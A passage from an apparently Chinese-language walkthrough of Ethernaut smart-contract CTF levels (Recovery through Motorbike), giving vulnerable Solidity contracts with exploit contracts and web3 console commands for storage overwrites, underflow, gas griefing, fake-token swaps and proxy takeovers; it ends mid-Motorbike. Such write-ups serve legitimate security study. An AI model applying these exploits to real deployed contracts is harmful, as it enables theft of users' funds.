\u4fdd\u8bc1\u8fd9\u524d\u9762\u6709\u4e24\u4e2a address function setTime ( uint _time ) public { owner = address ( _time ); } } \u5b9e\u9645\u64cd\u4f5c\uff1a > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<an address>' > contract . setFirstTime ( \"0x<Exploit contract address>\" ) > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<Exploit contract address>' > contract . setFirstTime ( player ) > await web3 . eth . getStorageAt ( instance , 2 ) // owner '0x000000000000000000000000<player address>' > await contract . owner () '0x<player address>' Recovery \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Recovery { //generate tokens function generateToken ( string memory _name , uint256 _initialSupply ) public { new SimpleToken ( _name , msg.sender , _initialSupply ); } } contract SimpleToken { using SafeMath for uint256 ; // public variables string public name ; mapping ( address => uint ) public balances ; // constructor constructor ( string memory _name , address _creator , uint256 _initialSupply ) public { name = _name ; balances [ _creator ] = _initialSupply ; } // collect ether in return for tokens receive () external payable { balances [ msg.sender ] = msg.value . mul ( 10 ); } // allow transfers of tokens function transfer ( address _to , uint _amount ) public { require ( balances [ msg.sender ] >= _amount ); balances [ msg.sender ] = balances [ msg.sender ]. sub ( _amount ); balances [ _to ] = _amount ; } // clean up after ourselves function destroy ( address payable _to ) public { selfdestruct ( _to ); } } \u9898\u610f\u662f instance \u8c03\u7528\u4e86 generateToken \u751f\u6210\u4e86\u4e00\u4e2a SimpleToken\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u751f\u6210\u7684\u5408\u7ea6\u5730\u5740\uff0c\u73b0\u5728\u8981\u8c03\u7528\u8fd9\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5176\u4e2d\u4f59\u989d\u8f6c\u5230 player \u8d26\u6237\u4e2d \u56e0\u4e3a\u533a\u5757\u94fe\u90fd\u662f\u900f\u660e\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u53bb Etherscan \u7684 Rinkeby \u7f51\u7edc \u4e2d\u67e5\u627e instance \u8fd9\u4e2a\u5730\u5740\u4e0a\u7684\u5408\u7ea6\uff0c\u53ca\u5176\u4e2d\u7684 internal txns\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a Contract Creation\uff0c\u90a3\u4e2a\u5730\u5740\u5c31\u662f\u751f\u6210\u7684 SimpleToken \u5730\u5740\uff0c\u6240\u4ee5\u5199\u4e00\u4e2a exp \u6765\u8c03\u7528\u90a3\u4e2a\u5730\u5740\u4e0a\u7684\u7684 destroy \u51fd\u6570\u5c31\u597d\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of SimpleToken */ contract Exploit { SimpleToken token ; constructor ( address payable challenge ) public { // challenge \u662f\u627e\u5230\u7684 SimpleToken \u5730\u5740 token = SimpleToken ( challenge ); } function exp () public { token . destroy ( msg.sender ); } } MagicNumber \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract MagicNum { address public solver ; constructor () public {} function setSolver ( address _solver ) public { solver = _solver ; } /* ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____ __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___ ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__ ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___ ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____ __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________ _\\///////////\\\\\\//____/\\\\\\/___________ ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ ___________\\///_____\\///////////////__ */ } \u9898\u76ee\u8981\u6c42\u5373\u5199\u4e00\u4e2a\u5408\u7ea6\uff0c\u5b57\u8282\u7801\u4e0d\u8d85\u8fc7 10 \u4e2a\u5b57\u8282\uff0c\u5728\u8c03\u7528 whatIsTheMeaningOfLife() \u65f6\u8fd4\u56de 42 \u6240\u4ee5\u53ef\u4ee5\u624b\u5199\u6c47\u7f16\uff0c\u6765\u5bf9\u4e8e\u6240\u6709\u8c03\u7528\u90fd\u76f4\u63a5\u8fd4\u56de 42\uff0c\u8981\u7528\u5230\u51e0\u4e2a\u6307\u4ee4\uff08\u53ef\u4ee5\u5728 https://ethervm.io/ \u770b\u5230\u8be6\u7ec6\u7684\u6307\u4ee4\u4e0e\u5b57\u8282\u7801\u7684\u5bf9\u5e94\u4ee5\u53ca\u4f5c\u7528\uff09 PUSH1\uff0860\uff09\uff1a\u5c06\u4e00\u4e2a uint8 \u538b\u5165\u6808\u4e2d MSTORE\uff0852\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa value\uff0c\u5c06 memory[offset:offset+32] \u8bbe\u7f6e\u4e3a value RETURN\uff08F3\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa length\uff0creturn memory[offset:offset+length] CODECOPY\uff0839\uff09\uff1a\u4ece\u6808\u4e0a\u4f9d\u6b21\u53d6\u51fa destOffset\u3001offset\u3001length\uff0c\u8bbe\u7f6e memory[destOffset:destOffset+length] = code[offset:offset+length] \u5728\u90e8\u7f72\u5408\u7ea6\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u6709\u4e00\u6bb5 deploy code\uff0c\u7528\u6765\u628a runtime code \u590d\u5236\u5230\u6307\u5b9a\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8981\u7f16\u5199\u4e24\u90e8\u5206\u5b57\u8282\u7801 runtime code: PUSH1 0x2a ; \u5c06 42 \u538b\u5165\u6808\u4e2d PUSH1 0x80 ; \u8981\u5b58\u50a8\u7684\u4f4d\u7f6e\uff0c\u4e00\u822c\u4e3a 0x80 MSTORE ; \u8bbe\u7f6e memory[0x80:0x80+0x20] = 0x2a PUSH1 0x20 ; length PUSH1 0x80 ; offset RETURN ; return memory[0x80:0x80+0x20] \u8f6c\u6362\u6210\u5b57\u8282\u7801\u5c31\u662f\uff1a602a 6080 52 6020 6080 f3 \u63a5\u4e0b\u6765\u8981\u5199 deploy code\uff0c\u5176\u4e2d\u8981\u5b8c\u6210\u4e24\u4e2a\u76ee\u6807\uff1a \u5c06 runtime code \u5b57\u8282\u7801\u62f7\u8d1d\u5230\u5185\u5b58\u4e2d \u5c06 runtime code \u8fd4\u56de EVM \u6c47\u7f16\uff1a PUSH1 0x0a ; length, runtime code \u957f\u5ea6\u4e3a 10 (0x0a) PUSH1 0x0c ; offset, \u5373 deploy code \u7684\u957f\u5ea6\uff0c\u6574\u4f53\u7b97\u4e0b\u6765\u4e3a 0x0C PUSH1 0x00 ; destOffset, \u5b58\u5165\u5185\u5b58\u4e2d\u8d77\u59cb\u4f4d\u7f6e CODECOPY ; \u5c06 runtime code \u62f7\u8d1d\u5230\u5185\u5b58\u5f00\u5934 PUSH1 0x0a ; length PUSH1 0x00 ; offset RETURN ; \u8fd4\u56de runtime code \u8f6c\u6362\u6210\u5b57\u8282\u7801\uff1a600a 600c 6000 39 600a 6000 f3\uff08\u957f\u5ea6\u6b63\u597d\u5bf9\u5e94 0x0c\uff09 \u8fde\u8d77\u6765\u5c31\u662f\u6700\u7ec8\u7684\u5b57\u8282\u7801\uff1a600a600c600039600a6000f3602a60805260206080f3 \u7136\u540e\u901a\u8fc7\u5411\u7a7a\u5730\u5740\u53d1\u9001\u4ea4\u6613\u7684\u5f62\u5f0f\u521b\u5efa\u5408\u7ea6\uff0c\u5e76\u627e\u5230\u5408\u7ea6\u5730\u5740\u518d setSolver \u5373\u53ef > web3 . eth . sendTransaction ({ from : player , data : \"0x600a600c600039600a6000f3602a60805260206080f3\" }) \u26cf\ufe0f Sent transaction \u26cf https : //rinkeby.etherscan.io/tx/<transaction hash> \u26cf\ufe0f Mined transaction \u26cf https : //rinkeby.etherscan.io/tx/<transaction hash> > contract . setSolver ( \"<contract address>\" ) \u5176\u4e2d contract address \u901a\u8fc7\u8bbf\u95ee\u7ed9\u51fa\u7684 etherscan \u7684\u7f51\u5740\u5c31\u53ef\u4ee5\u67e5\u5230\u521b\u5efa\u7684\u5408\u7ea6\u5730\u5740 Alien Codex \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.5.0 ; import '../helpers/Ownable-05.sol' ; contract AlienCodex is Ownable { bool public contact ; bytes32 [] public codex ; modifier contacted () { assert ( contact ); _ ; } function make_contact () public { contact = true ; } function record ( bytes32 _content ) contacted public { codex . push ( _content ); } function retract () contacted public { codex . length -- ; } function revise ( uint i , bytes32 _content ) contacted public { codex [ i ] = _content ; } } \u8981\u6c42\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u8fd9\u4e2a owner \u7684\u5b58\u50a8\u662f\u5728 Ownable \u4e2d\u5b9a\u4e49\u7684\uff0c\u5b83\u4f1a\u548c contact \u4e00\u8d77\u653e\u5728 storage \u7684 slot 0 \u5904\uff0c\u76ee\u7684\u5c31\u662f\u6539\u53d8\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u503c \u800c slot 1 \u7684\u4f4d\u7f6e\u5f00\u59cb\u5c31\u662f codex \u7684\u5b58\u50a8\uff0c\u5148\u662f\u957f\u5ea6\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 retract() \u51fd\u6570\u6765\u4f7f length \u5411\u4e0b\u6ea2\u51fa\u53d8\u6210 2**256-1\uff0c\u4e5f\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230\u5168\u90e8\u7684 storage \u533a\u57df\uff0c\u6240\u4ee5\u5c31\u53ea\u9700\u8981\u627e\u5230 slot 0 \u5bf9\u5e94\u7684 codex[i] \u7684 i \u56e0\u4e3a codex[i] \u5b9e\u9645\u4e0a\u662f\u8868\u793a keccak256(slot of codex) + i \u5904\uff0c\u6240\u4ee5\u53ea\u8981\u4ee4 i = 2**256 - keccak256(slot of codex) \u5c31\u53ef\u4ee5\u4f7f\u5176\u53d8\u4e3a 2**256\uff0c\u5373\u6ea2\u51fa\u5230 0 \u7684\u4f4d\u7f6e \u800c codex \u7684 slot \u5c31\u662f 1\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8ba1\u7b97 2**256 - keccak256(1): contract Exploit { function calc () public view returns ( bytes32 ) { return keccak256 ( abi . encode ( bytes32 ( uint ( 1 )))); } } \u5f97\u5230 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6\uff0c\u7528 2**256 \u51cf\u53bb\u5b83\u5f97\u5230 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a \u7136\u540e\u66f4\u6539\u8fd9\u4e2a\u4f4d\u7f6e\u5230 player \u5730\u5740\u5c31\u597d\u4e86\uff08\u8981\u5728\u5730\u5740\u524d\u9762\u8865\u4e0a\u4e00\u5806 0 \u548c contact\uff09 > contract . retract () > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272' > await web3 . eth . getStorageAt ( instance , 1 ) '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' > contract . revise ( \"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a\" , \"0x000000000000000000000001<player address>\" ) Denial \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Denial { using SafeMath for uint256 ; address public partner ; // withdrawal partner - pay the gas, split the withdraw address payable public constant owner = address ( 0xA9E ); uint timeLastWithdrawn ; mapping ( address => uint ) withdrawPartnerBalances ; // keep track of partners balances function setWithdrawPartner ( address _partner ) public { partner = _partner ; } // withdraw 1% to recipient and 1% to owner function withdraw () public { uint amountToSend = address ( this ). balance . div ( 100 ); // perform a call without checking return // The recipient can revert, the owner will still get their share partner . call { value : amountToSend }( \"\" ); owner . transfer ( amountToSend ); // keep track of last withdrawal time timeLastWithdrawn = now ; withdrawPartnerBalances [ partner ] = withdrawPartnerBalances [ partner ]. add ( amountToSend ); } // allow deposit of funds receive () external payable {} // convenience function function contractBalance () public view returns ( uint ) { return address ( this ). balance ; } } \u76ee\u7684\u662f\u8981\u963b\u6b62 owner \u5728 withdraw \u7684\u65f6\u5019\u63d0\u53d6\u5230\u8d44\u4ea7 \u91cd\u5165\u653b\u51fb\u6ca1\u6709\u6253\u51fa\u6765\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u8ba9\u653b\u51fb\u5408\u7ea6\u7684 fallback \u89e6\u53d1 assert \u5f02\u5e38\uff0c\u8fd9\u6837\u6d88\u8017\u6389\u6240\u6709\u7684 gas \u540e\u5c31\u518d\u6ca1\u6cd5\u6b63\u5e38\u5411 owner \u8f6c\u8d26\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Denial */ contract Exploit { Denial challenge ; constructor ( address payable addr ) public { challenge = Denial ( addr ); } function exp () public { challenge . setWithdrawPartner ( address ( this )); challenge . withdraw (); } receive () external payable { assert ( false ); } } Shop \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; interface Buyer { function price () external view returns ( uint ); } contract Shop { uint public price = 100 ; bool public isSold ; function buy () public { Buyer _buyer = Buyer ( msg.sender ); if ( _buyer . price () >= price && ! isSold ) { isSold = true ; price = _buyer . price (); } } } \u76ee\u7684\u662f\u4f7f price \u5c0f\u4e8e 100\u3002\u548c Elevator \u7c7b\u4f3c\uff0c\u53ea\u8981\u4f7f\u4e24\u6b21\u8c03\u7528 price \u5f97\u5230\u7684\u503c\u4e0d\u4e00\u6837\u5c31\u53ef\u4ee5\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Shop */ contract Exploit { Shop challenge ; constructor ( address addr ) public { challenge = Shop ( addr ); } function price () external view returns ( uint ) { if ( challenge . isSold ()) { return 90 ; } return 100 ; } function exp () public { challenge . buy (); } } Dex & Dex Two \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\" ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Dex { using SafeMath for uint ; address public token1 ; address public token2 ; constructor ( address _token1 , address _token2 ) public { token1 = _token1 ; token2 = _token2 ; } function swap ( address from , address to , uint amount ) public { require ( IERC20 ( from ). balanceOf ( msg.sender ) >= amount , \"Not enough to swap\" ); uint swap_amount = get_swap_price ( from , to , amount ); IERC20 ( from ). transferFrom ( msg.sender , address ( this ), amount ); IERC20 ( to ). approve ( address ( this ), swap_amount ); IERC20 ( to ). transferFrom ( address ( this ), msg.sender , swap_amount ); } function add_liquidity ( address token_address , uint amount ) public { IERC20 ( token_address ). transferFrom ( msg.sender , address ( this ), amount ); } function get_swap_price ( address from , address to , uint amount ) public view returns ( uint ){ return (( amount * IERC20 ( to ). balanceOf ( address ( this ))) / IERC20 ( from ). balanceOf ( address ( this ))); } function approve ( address spender , uint amount ) public { SwappableToken ( token1 ). approve ( spender , amount ); SwappableToken ( token2 ). approve ( spender , amount ); } function balanceOf ( address token , address account ) public view returns ( uint ){ return IERC20 ( token ). balanceOf ( account ); } } contract SwappableToken is ERC20 { constructor ( string memory name , string memory symbol , uint initialSupply ) public ERC20 ( name , symbol ) { _mint ( msg.sender , initialSupply ); } } \u9898\u610f\u5c31\u662f\u73a9\u5bb6\u8d26\u6237\u4e0a\u7684 token1 \u548c token2 \u90fd\u5404\u6709 10 \u4e2a token\uff0c\u800c\u9898\u76ee\u8d26\u6237\u4e0a\u6709 100 \u4e2a\uff0c\u76ee\u7684\u662f\u628a\u9898\u76ee\u8d26\u6237\u4e0a\u7684\u67d0\u4e2a token \u6e05\u96f6 \u9898\u76ee\u7684 Dex \u5408\u7ea6\u4e3b\u8981\u63d0\u4f9b\u4e86 swap \u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u5728\u4e24\u4e2a token \u95f4\u4ea4\u6362\u91d1\u989d\u3002\u4f46\u662f\u8f6c\u51fa\u7684\u65f6\u5019\u5148\u8c03\u7528\u4e86 get_swap_price \u6765\u8ba1\u7b97\u91d1\u989d\uff0c\u800c\u4e14\u5728\u5176\u4e2d\u8c03\u7528\u7684\u662f\u4e24\u65b9\u683c\u5b50\u7684 balanceOf \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u65b0\u7684 IERC20 \u7684 token\uff0c\u8ba9\u5b83\u7684 balanceOf \u59cb\u7ec8\u8fd4\u56de 1\uff0c\u4f5c\u4e3a\u5206\u6bcd\uff0c\u8fd9\u6837\u8f6c\u51fa\u7684\u65f6\u5019\u5c31\u4f1a\u8f6c\u51fa\u9898\u76ee token \u4e2d\u7684\u6240\u6709\u4f59\u989d\u4e86 Dex Two \u548c Dex \u5dee\u522b\u5c31\u5728\u4e8e DexTwo \u9700\u8981\u5c06\u4e24\u4e2a token \u90fd\u7f6e\u4e3a 0\uff0c\u7528 exp \u51fd\u6570\u5206\u522b\u6253\u4e0b token1 \u548c token2 \u5c31\u884c exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Dex */ contract ExploitToken { function balanceOf ( address account ) public view returns ( uint256 ) { return 1 ; } function transferFrom ( address , address , uint256 ) public returns ( bool ) { return true ; } } contract Exploit { address token = address ( new ExploitToken ()); Dex challenge ; constructor ( address addr ) public { challenge = Dex ( addr ); } function exp ( address token1 ) public { challenge . swap ( token , token1 , 1 ); } } Puzzle Wallet \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; pragma experimental ABIEncoderV2 ; import \"@openzeppelin/contracts/math/SafeMath.sol\" ; import \"@openzeppelin/contracts/proxy/UpgradeableProxy.sol\" ; contract PuzzleProxy is UpgradeableProxy { address public pendingAdmin ; address public admin ; constructor ( address _admin , address _implementation , bytes memory _initData ) UpgradeableProxy ( _implementation , _initData ) public { admin = _admin ; } modifier onlyAdmin { require ( msg.sender == admin , \"Caller is not the admin\" ); _ ; } function proposeNewAdmin ( address _newAdmin ) external { pendingAdmin = _newAdmin ; } function approveNewAdmin ( address _expectedAdmin ) external onlyAdmin { require ( pendingAdmin == _expectedAdmin , \"Expected new admin by the current admin is not the pending admin\" ); admin = pendingAdmin ; } function upgradeTo ( address _newImplementation ) external onlyAdmin { _upgradeTo ( _newImplementation ); } } contract PuzzleWallet { using SafeMath for uint256 ; address public owner ; uint256 public maxBalance ; mapping ( address => bool ) public whitelisted ; mapping ( address => uint256 ) public balances ; function init ( uint256 _maxBalance ) public { require ( maxBalance == 0 , \"Already initialized\" ); maxBalance = _maxBalance ; owner = msg.sender ; } modifier onlyWhitelisted { require ( whitelisted [ msg.sender ], \"Not whitelisted\" ); _ ; } function setMaxBalance ( uint256 _maxBalance ) external onlyWhitelisted { require ( address ( this ). balance == 0 , \"Contract balance is not 0\" ); maxBalance = _maxBalance ; } function addToWhitelist ( address addr ) external { require ( msg.sender == owner , \"Not the owner\" ); whitelisted [ addr ] = true ; } function deposit () external payable onlyWhitelisted { require ( address ( this ). balance <= maxBalance , \"Max balance reached\" ); balances [ msg.sender ] = balances [ msg.sender ]. add ( msg.value ); } function execute ( address to , uint256 value , bytes calldata data ) external payable onlyWhitelisted { require ( balances [ msg.sender ] >= value , \"Insufficient balance\" ); balances [ msg.sender ] = balances [ msg.sender ]. sub ( value ); ( bool success , ) = to . call { value : value }( data ); require ( success , \"Execution failed\" ); } function multicall ( bytes [] calldata data ) external payable onlyWhitelisted { bool depositCalled = false ; for ( uint256 i = 0 ; i < data . length ; i ++ ) { bytes memory _data = data [ i ]; bytes4 selector ; assembly { selector : = mload ( add ( _data , 32 )) } if ( selector == this . deposit . selector ) { require ( ! depositCalled , \"Deposit can only be called once\" ); // Protect against reusing msg.value depositCalled = true ; } ( bool success , ) = address ( this ). delegatecall ( data [ i ]); require ( success , \"Error while delegating call\" ); } } } \u9898\u76ee\u6bd4\u8f83\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u4f7f PuzzleProxy \u7684 admin \u4e3a player \u56e0\u4e3a PuzzleProxy \u548c PuzzleWallet \u90e8\u7f72\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u5b83\u4eec\u7684 storage \u4f1a\u5171\u7528\uff0c\u6240\u4ee5\u5c31\u5bfc\u81f4\u4e86 PuzzleProxy \u7684 pendingAdmin \u5bf9\u5e94\u4e86 PuzzleWallet \u7684 owner\uff0cPuzzleWallet \u7684 maxBalance \u5bf9\u5e94\u4e86 PuzzleProxy \u7684 admin \u4ece\u540e\u5f80\u524d\u63a8\uff1a \u8981\u4f7f admin \u53d8\u4e3a player\uff0c\u5219\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e3a player \u800c setMaxBalance \u51fd\u6570\u9700\u8981\u5148\u4f7f\u5f53\u524d\u5408\u7ea6\u8d26\u6237\u7684\u4f59\u989d\u53d8\u4e3a 0 \u5408\u7ea6\u8d26\u6237\u4f59\u989d\u51cf\u5c11\u7684\u65b9\u5f0f\u5728 execute \u4e2d\u7684 call\uff0c\u4f7f\u4f59\u989d\u51cf\u5c11 value \u4f46\u8fd9\u6837\u8981\u4f7f balances[player] >= value \u800c\u901a\u8fc7 deposit \u589e\u52a0 balances[player] \u7684\u8bdd\uff0c\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u4e5f\u4f1a\u540c\u6b65\u589e\u52a0 \u6240\u4ee5\u8981\u4f7f\u7528 multicall \u51fd\u6570\u6765\u4f7f balances[player] \u589e\u52a0\u91cf\u4e3a\u5408\u7ea6\u8d26\u6237\u4f59\u989d\u589e\u52a0\u91cf\u7684\u4e8c\u500d \u4f46\u662f multicall \u4e2d\u68c0\u6d4b\u4e86 selector \u4f7f deposit \u53ea\u80fd\u8c03\u7528\u4e00\u6b21 \u8fd9\u53ef\u4ee5\u901a\u8fc7 multicall \u4e2d\u6267\u884c\u4e24\u4e2a multicall\uff0c\u6bcf\u4e2a multicall \u8c03\u7528\u4e00\u6b21 deposit \u8fd9\u6837\u5206\u6790\u4e4b\u540e\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\uff0c\u9996\u5148\u8c03\u7528 proposeNewAdmin \u6765\u4f7f pendingAdmin\uff08owner\uff09\u53d8\u4e3a player\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u53d1\u9001\u5408\u7ea6\u7684\u65b9\u5f0f\u8c03\u7528 > await web3 . eth . getStorageAt ( instance , 0 ) // owner '0x000000000000000000000000<level address>' > web3 . utils . sha3 ( \"proposeNewAdmin(address)\" ). slice ( 0 , 10 ) // selector '0xa6376746' > data = web3 . utils . sha3 ( \"proposeNewAdmin(address)\" ). slice ( 0 , 10 ) + player . slice ( 2 ). padStart ( 64 , \"0\" ) '0xa6376746000000000000000000000000<player address>' > web3 . eth . sendTransaction ({ from : player , to : instance , data : data }) > await web3 . eth . getStorageAt ( instance , 0 ) '0x000000000000000000000000<player address>' \u7136\u540e\u62ff\u5230 owner \u540e\u9700\u8981\u5c06\u81ea\u5df1\u52a0\u5165\u767d\u540d\u5355\uff0c\u5e76\u4e14\u5148\u67e5\u8be2\u4e00\u4e0b\u5408\u7ea6\u8d26\u6237\u4f59\u989d > await contract . addToWhitelist ( player ) > await getBalance ( instance ) '0.001' \u6240\u4ee5\u9700\u8981\u6784\u9020\u4e00\u4e2a calldata\uff0c\u5b83\u4f1a\u901a\u8fc7 multicall \u8c03\u7528 deposit\uff0c\u7136\u540e\u628a\u4e24\u4e2a\u8fd9\u4e2a calldata \u4f20\u5165 multicall\uff0c\u540c\u65f6\u9644\u5e26 value 0.001 ether\uff0c\u8fd9\u6837 balances[player] \u5c31\u4f1a\u589e\u52a0 0.002 ether\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 execute \u76f4\u63a5\u63d0\u53d6\u51fa\u8fd9 0.002 ether \u63d0\u53d6\u540e\u5408\u7ea6\u8d26\u6237\u7684 balance \u53d8\u4e3a 0\uff0c\u5c31\u53ef\u4ee5\u8bbe\u7f6e maxBalance \u4e86 > web3 . utils . sha3 ( \"deposit()\" ). slice ( 0 , 10 ) // deposit selector '0xd0e30db0' > data = ( await contract . methods [ \"multicall(bytes[])\" ]. request ([ \"0xd0e30db0\" ])). data // \u6784\u9020\u901a\u8fc7 multicall \u8c03\u7528 deposit \u7684 calldata '0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000' > await contract . multicall ([ data , data ], { value : toWei ( \"0.001\" )}) > await getBalance ( instance ) '0.002' > contract . execute ( player , toWei ( \"0.002\" ), 0 > await getBalance ( instance ) '0' > await web3 . eth . getStorageAt ( instance , 1 ) '0x000000000000000000000000<level address>' > contract . setMaxBalance ( player ) > await web3 . eth . getStorageAt ( instance , 1 ) '0x000000000000000000000000<player address>' Motorbike \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity < 0.7.0 ; import \"@openzeppelin/contracts/utils/Address.sol\" ; import \"@openzeppelin/contracts/proxy/Initializable.sol\" ; contract Motorbike { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; struct AddressSlot { address value ; } // Initializes the upgradeable proxy with an initial implementation specified by `_logic`. constructor ( address _logic ) public { require ( Address . isContract ( _logic ), \"ERC1967: new implementation is not a contract\" ); _getAddressSlot ( _IMPLEMENTATION_SLOT ). value = _logic ; ( bool success ,) = _logic . delegatecall ( abi . encodeWithSignature ( \"initialize()\" ) ); require ( success , \"Call failed\" ); } // Delegates the current call to `implementation`. function _delegate ( address implementation ) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { calldatacopy ( 0 , 0 , calldatasize ()) let result : = delegatecall ( gas (), implementation , 0 , calldatasize (), 0 , 0 ) returndatacopy ( 0 , 0 , returndatasize ()) switch result case 0 { revert ( 0 , returndatasize ()) } default { return ( 0 , returndatasize ()) } } } // Fallback function that delegates calls to the address returned by `_implementation()`. // Will run if no other function in the contract matches the call data fallback () external payable virtual { _delegate ( _getAddressSlot ( _IMPLEMENTATION_SLOT ). value ); } // Returns an `AddressSlot` with member `value` located at `slot`. function _getAddressSlot ( bytes32 slot ) internal pure returns ( AddressSlot storage r ) { assembly { r_slot : = slot } } } contract Engine is Initializable { // keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1 bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc ; address public upgrader ; uint256 public horsePower ; struct AddressSlot { address value ; } function initialize () external initializer { horsePower = 1000 ; upgrader = msg.sender ; } // Upgrade the implementation of the proxy to `newImplementation` // subsequently execute the function call function upgradeToAndCall ( address newImplementation , bytes memory data ) external payable { _authorizeUpgrade (); _upgradeToAndCall ( newImplementation , data ); } // Restrict to upgrader role function _authorizeUpgrade () internal view { require ( msg.sender == upgrader , \"Can't upgrade\" ); } // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call. function _upgradeToAndCall ( address newImplementation , bytes memory data ) internal { // Initial upgrade and setup call _setImplementation ( newImplementation ); if ( data . length > 0 ) { ( bool success ,) = newImplementation . delegatecall ( data ); require ( success , \"Call failed\" ); } } // Stores a new address in the EIP1967 implementation slot. function _setImplementation ( address newImplementation ) private { require ( Address . isContract ( newImplementation ), \"ERC1967: new implementation is not a contract\" ); AddressSlot storage r ; assembly { r_slot : = _IMPLEMENTATION_SLOT } r . value = newImplementation ; } } \u540c\u6837\u6709\u4e9b\u590d\u6742\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u8981\u9500\u6bc1\u6389 Engine \u56e0\u4e3a\u6574\u4e2a\u5408\u7ea6\u4e2d\u90fd\u6ca1\u6709 selfdestruct\uff0c\u6240\u4ee5\u8981\u8f7d\u5165\u81ea\u5df1\u7684\u5408\u7ea6\uff0c\u53ef\u4ee5\u901a\u8fc7 upgradeToAndCall \u51fd\u6570\u6765\u8f7d\u5165\u5408\u7ea6\u5e76\u8c03\u7528\uff0c\u8fd9\u9700\u8981\u901a\u8fc7 _authorizeUpgrade \u51fd\u6570\u7684\u68c0\u67e5\uff0c\u4e5f\u5c31\u662f\u68c0\u67e5 sender \u662f\u5426\u662f upgrader\uff0c\u800c\u6539\u53d8 upgrader \u53ef\u4ee5\u901a\u8fc7 initialize \u51fd\u6570\u6765\u5b8c\u6210 \u6240\u4ee5\u653b\u51fb\u6d41\u7a0b\u5c31\u662f\u5148\u901a\u8fc7 getStorageAt \u6765\u5f97\u5230\u90e8\u7f72\u7684 Engine \u7684\u5730\u5740\uff0c\u7136\u540e\u8c03\u7528 initialize\uff0cupgradeToAndCall 